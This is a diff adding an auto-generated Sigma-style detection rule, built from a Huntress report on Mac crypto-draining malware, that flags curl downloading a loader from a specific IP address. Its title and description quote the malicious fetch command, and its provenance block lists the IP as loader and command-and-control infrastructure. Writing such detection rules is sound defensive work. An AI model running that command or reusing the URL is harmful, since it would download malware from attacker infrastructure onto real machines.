@@ -1,0 +1,38 @@
+title: 'Command the source shows being run: curl http://193.29.224.151/92392991a0cca55?force=1'
+id: 4105ead9-6ee9-4487-81ab-5bdbc3177d0d
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "curl -kfsSL "http://193.29.224.151/92392991a0cca55?force=1"
+  -o .UlaccK".'
+references:
+- https://www.huntress.com/blog/mac-crypto-draining-malware
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-03'
+tags: []
+logsource:
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: /curl
+    CommandLine|contains: http://193.29.224.151/92392991a0cca55?force=1
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: http://193.29.224.151/92392991a0cca55?force=1
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: 193.29.224[.]151 IP address hosting the loader
+- value: 193.29.224.151
+  type: ipv4
+  role: c2
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: The IP address range that hosted the malware belongs to a known Russian bulletproof hosting
+    provider that was sanctioned by the US and other countries in 2025.
+hunt_id: H-0001
